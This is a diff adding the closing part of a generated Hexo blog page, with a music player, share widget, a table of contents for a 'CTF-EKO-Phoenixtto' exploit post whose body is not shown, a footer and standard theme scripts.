+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="../js/music-player/utill.js"></script>
+
+
+<script src="../js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="../js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF-EKO-Phoenixtto"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">CTF-EKO-Phoenixtto</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exploit"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">Exploit</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#EKO" title="EKO">EKO</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2023 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="../js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="../js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="../js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="../js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://thomasxu-blockchain.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🍰&#34;,&#34;当大潮褪去，才知道谁在裸泳&#34;,&#34;🍭&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
